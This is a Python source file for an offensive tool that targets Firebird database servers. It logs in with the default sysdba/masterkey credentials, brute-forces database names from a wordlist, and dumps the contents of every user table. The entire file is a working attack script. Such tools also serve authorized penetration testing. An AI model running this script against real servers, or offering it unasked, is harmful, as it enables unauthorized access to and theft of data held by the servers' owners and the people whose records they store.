import argparse
import sys

wordList = ""

try:
    import firebirdsql
except ImportError:
    try:
        import fdb as firebirdsql
    except ImportError:
        print("Install firebirdsql (pip install firebirdsql) or fdb (pip install fdb)")
        sys.exit()


# A path that is very unlikely to exist. Used purely to probe auth:
# if the server complains about the *file*, auth succeeded.
PROBE_DB = "\\firebird_brute_probe_does_not_exist.fdb"


def classify_error(msg):
    """Return one of: 'credentials', 'notfound', 'wirecrypt', 'network', 'unknown'."""
    m = msg.lower()
    if ("user name and password" in m or "password are not defined" in m
            or "your user name and password" in m or "login failed" in m
            or ("unavailable database" in m and "user" in m)):
        return "credentials"
    if ("cannot find the file" in m or "not found" in m or "no such" in m
            or "does not exist" in m
            or ("createfile" in m and "i/o error" in m)):
        return "notfound"
    if "wirecrypt" in m or "unsupported" in m or "handshake" in m:
        return "wirecrypt"
    if ("connection refused" in m or "connection reset" in m
            or "timed out" in m or "timeout" in m
            or "network" in m or "unreachable" in m):
        return "network"
    return "unknown"


def checkCredentials(ipAddr):
    """Probe the server to determine whether sysdba/masterkey works.

    Returns True if credentials are accepted, False otherwise.
    Exits the program on unrecoverable conditions (network / wirecrypt).
    """
    print("[*] Checking credentials (sysdba/masterkey) against " + ipAddr)
    try:
        con = firebirdsql.connect(
            host=ipAddr, database=PROBE_DB,
            user='sysdba', password='masterkey'
        )
        con.close()
        print("[+] Credentials ACCEPTED")
        return True
    except firebirdsql.OperationalError as e:
        msg = str(e)
        kind = classify_error(msg)
        if kind == "credentials":
            print("[-] Credentials REJECTED: sysdba/masterkey do not work on this server")
            return False
        elif kind == "notfound":
            # Auth passed, server just couldn't open the file. That's success.
            print("[+] Credentials ACCEPTED")
            return True
        elif kind == "wirecrypt":
            print("[!] WireCrypt/protocol issue - cannot negotiate encryption. Aborting.")
            sys.exit(2)
        elif kind == "network":
            print("[!] Network error - server unreachable. Aborting.")
            sys.exit(2)
        else:
            print("[!] Unexpected error during credential check. Aborting.")
            print("    " + " ".join(msg.split()))
            sys.exit(2)
    except Exception as e:
        print("[!] Unexpected error during credential check. Aborting.")
        print("    " + " ".join(str(e).split()))
        sys.exit(2)


def extractDB(database, ipAddr):
    con = firebirdsql.connect(
        host=ipAddr, database=database,
        user='sysdba', password='masterkey'
    )
    cur = con.cursor()
    cur.execute("select rdb$relation_name from rdb$relations where rdb$view_blr is null and (rdb$system_flag is null or rdb$system_flag = 0);")
    results = cur.fetchall()
    print("\n[+] Found the below tables")
    for x in results:
        print("    " + x[0])

    for x in results:
        print("\n[+] Extracting the contents from the table: " + x[0])
        cur.execute("select * from " + x[0] + ";")
        results = cur.fetchall()
        for line in results:
            print("    " + str(line))

    cur.close()
    con.close()


def getDatabase(ipAddr):
    candidates = []
    with open(wordList) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            candidates.append(line)

    print("[*] Bruteforcing " + str(len(candidates)) + " database name(s)")
    print("")

    currentWord = ""
    found = False
    for word in candidates:
        currentWord = word
        try:
            con = firebirdsql.connect(
                host=ipAddr, database=word,
                user='sysdba', password='masterkey'
            )
            print("[FOUND]     " + word)
            found = True
            con.close()
            break
        except firebirdsql.OperationalError as e:
            msg = str(e)
            kind = classify_error(msg)
            if kind == "credentials":
                print("[REJECTED]  " + word + "  (credentials no longer accepted)")
                return
            elif kind == "wirecrypt":
                print("[PROTO]     " + word + "  (WireCrypt/protocol issue)")
                return
            elif kind == "notfound":
                print("[NOT FOUND] " + word)
            else:
                print("[ERROR]     " + word + "  (" + " ".join(msg.split()) + ")")
            continue
        except Exception as e:
            print("[ERROR]     " + word + "  (" + " ".join(str(e).split()) + ")")
            continue

    if not found:
        print("")
        print("[-] No valid database name found in wordlist")
        return

    extractDB(currentWord, ipAddr)


def connectFirebird(ipAddr):
    if not checkCredentials(ipAddr):
        sys.exit(1)
    getDatabase(ipAddr)


if __name__ == '__main__':
    print("This tool attempts to brute force the database names on the Firebird database server using the default credentials (sysdba|masterkey)")
    parser = argparse.ArgumentParser()
    parser.add_argument('-host', dest='ipAddr', action='store', help='[IP address of Firebird database server]')
    parser.add_argument('-wordlist', dest='wordList', action='store', help='[File containing list of database names to brute force]')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    options = parser.parse_args()
    if options.wordList:
        wordList = options.wordList
    if options.ipAddr:
        if not wordList:
            print("[-] A wordlist is required (-wordlist <file>)")
            sys.exit(1)
        connectFirebird(options.ipAddr)
